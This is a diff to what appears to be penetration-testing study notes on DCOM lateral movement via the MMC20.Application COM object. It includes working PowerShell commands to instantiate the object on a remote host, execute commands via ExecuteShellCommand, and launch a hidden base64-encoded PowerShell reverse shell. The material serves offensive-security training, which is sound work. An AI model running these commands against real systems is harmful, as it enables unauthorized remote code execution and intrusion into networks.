@@ -488,8 +488,42 @@ Mode                LastWriteTime         Length Name
 
 ## Distributed Component Object Model (DCOM)
 
-{% hint style="info" %}
-There are two other well-known lateral movement techniques worth mentioning: abusing Windows Management Instrumentation680 and a technique known as PowerShell Remoting.
-{% endhint %}
+Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.
 
-Takes advantage of Office.
+[Cybereason ](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)documented a collection of various DCOM lateral movement techniques, including one [discovered by Matt Nelson](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/), which we are covering in this section.
+
+he discovered DCOM lateral movement technique is based on the Microsoft Management Console (MMC) COM application that is employed for scripted automation of Windows systems.
+
+The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows the execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
+
+From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.
+
+{% code title="Remotely Instantiating the MMC Application object" overflow="wrap" lineNumbers="true" %}
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+```
+{% endcode %}
+
+{% code title=" Executing a command on the remote DCOM object" overflow="wrap" lineNumbers="true" %}
+```
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+```
+{% endcode %}
+
+{% code title=" Verifying that calculator is running on FILES04" overflow="wrap" lineNumbers="true" %}
+```
+C:\Users\Administrator>tasklist | findstr "calc"
+win32calc.exe                 4764 Services                   0     12,132 K
+```
+{% endcode %}
+
+We can now improve our craft by extending this attack to a full reverse shell similar to what we did in the WMI and WinRM section earlier in this Module.
+
+Having generated the base64 encoded reverse shell with our Python script, we can replace our DCOM payload with it.
+
+{% code title="Adding a reverse-shell as a DCOM payload on CLIENT74" overflow="wrap" lineNumbers="true" %}
+```
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+```
+{% endcode %}
